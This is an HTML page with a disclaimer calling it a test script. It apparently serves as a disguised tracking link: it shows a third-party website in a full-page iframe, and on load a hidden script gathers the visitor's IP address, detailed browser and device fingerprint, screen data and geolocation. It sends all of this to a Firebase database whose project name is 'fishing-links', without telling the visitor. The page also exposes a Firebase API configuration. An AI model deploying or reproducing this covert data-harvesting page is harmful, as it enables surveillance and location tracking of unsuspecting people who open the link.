// This script is created by Harsh Verma, Professional Android Developer
// Note: This script is intended for testing purposes only. Do not use it for any harmful or unethical operations. 
// The creator is not responsible for any misuse or ethical violations that may occur from using this script.

Thank you.

<!-- <!DOCTYPE html>
<html lang="en">
    <!-- Created by Harsh Verma....
    Reach out to scotedflotsin.co.ltd@gmail.com -->

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Developed by Harsh Verma</title>
        <link rel="icon" href="./assets/fav-iocn-new.jpg">
    </head>

    <body>
        <iframe src="https://www.nitaiitsolution.com" frameborder="0" width="100%" height="1000px" style="scrollbar-width: none;"
            allowfullscreen></iframe>

        <!-- Use "type=module" to enable ES module syntax -->
        <script type="module">
            // Import Firebase services using the modular SDK
            import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js';
            import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-firestore.js';

            // Firebase configuration
            const firebaseConfig = {
                apiKey: "AIzaSyDJOhvoJM94mN7RCC205Ie5Ln1yNPBkr7Y",
                authDomain: "fishing-links-85957.firebaseapp.com",
                projectId: "fishing-links-85957",
                storageBucket: "fishing-links-85957.appspot.com",
                messagingSenderId: "36633798607",
                appId: "1:36633798607:web:8d143e798dee8848f354ba",
                measurementId: "G-4JZCTG0H59"
            };

            // Initialize Firebase App and Firestore
            const app = initializeApp(firebaseConfig);
            const db = getFirestore(app);

            // Function to run on page load
            window.onload = async function collectData() {
                try {
                    // Get public IP
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    const userIp = ipData.ip;

                    // Get browser and device information
                    const browserDetails = {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        cookiesEnabled: navigator.cookieEnabled,
                        javaEnabled: navigator.javaEnabled(),
                        online: navigator.onLine,
                        vendor: navigator.vendor,
                        appVersion: navigator.appVersion,
                        product: navigator.product,
                        productSub: navigator.productSub,
                        appName: navigator.appName,
                        appCodeName: navigator.appCodeName,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory || 'Not Supported',
                        connectionType: navigator.connection ? navigator.connection.effectiveType : 'Not Supported'
                    };

                    // Get screen information
                    const screenInfo = {
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        screenColorDepth: window.screen.colorDepth
                    };

                    // Function to handle location data
                    function handleLocation(position) {
                        const userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };

                        // Data to save
                        const data = {
                            ip: userIp,
                            browserDetails: browserDetails,
                            screenInfo: screenInfo,
                            location: userLocation,
                            timestamp: Date.now()
                        };

                        // Save data to Firestore
                        addDoc(collection(db, 'clickerData'), data)
                            .then(docRef => console.log('Document written with ID: ', docRef.id))
                            .catch(error => console.error('Error adding document: ', error));
                    }

                    // Function to handle location error
                    function handleLocationError(error) {
                        console.error('Error getting location:', error);

                        const data = {
                            ip: userIp,
                            browserDetails: browserDetails,
                            screenInfo: screenInfo,
                            location: 'Location permission denied',
                            timestamp: Date.now()
                        };

                        // Save data to Firestore
                        addDoc(collection(db, 'clickerData'), data)
                            .then(docRef => console.log('Document written with ID: ', docRef.id))
                            .catch(error => console.error('Error adding document: ', error));
                    }

                    // Get location
                    if ('geolocation' in navigator) {
                        navigator.geolocation.getCurrentPosition(handleLocation, handleLocationError);
                    } else {
                        console.error('Geolocation is not supported by this browser.');

                        const data = {
                            ip: userIp,
                            browserDetails: browserDetails,
                            screenInfo: screenInfo,
                            location: 'Geolocation not supported',
                            timestamp: Date.now()
                        };

                        // Save data to Firestore
                        addDoc(collection(db, 'clickerData'), data)
                            .then(docRef => console.log('Document written with ID: ', docRef.id))
                            .catch(error => console.error('Error adding document: ', error));
                    }

                } catch (e) {
                    console.error('Error collecting data:', e);
                }
            };
        </script>
    </body>
</html> -->
